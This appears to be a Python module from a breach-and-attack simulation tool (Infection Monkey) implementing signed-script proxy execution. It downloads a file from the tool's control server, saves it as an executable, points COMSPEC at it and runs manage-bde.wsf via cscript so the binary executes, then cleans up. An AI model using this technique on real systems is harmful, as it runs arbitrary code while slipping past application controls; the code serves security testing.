import os

from infection_monkey.control import ControlClient

TEMP_COMSPEC = os.path.join(os.getcwd(), 'random_executable.exe')


def get_windows_commands_to_proxy_execution_using_signed_script():
    download = ControlClient.get_T1216_pba_file()
    with open(TEMP_COMSPEC, 'wb') as random_exe_obj:
        random_exe_obj.write(download.content)
        random_exe_obj.flush()

    windir_path = os.environ['WINDIR']
    signed_script = os.path.join(windir_path, 'System32', 'manage-bde.wsf')

    return [
        f'set comspec={TEMP_COMSPEC} &&',
        f'cscript {signed_script}'
    ]


def get_windows_commands_to_reset_comspec(original_comspec):
    return f'set comspec={original_comspec}'


def get_windows_commands_to_delete_temp_comspec():
    return f'del {TEMP_COMSPEC} /f'
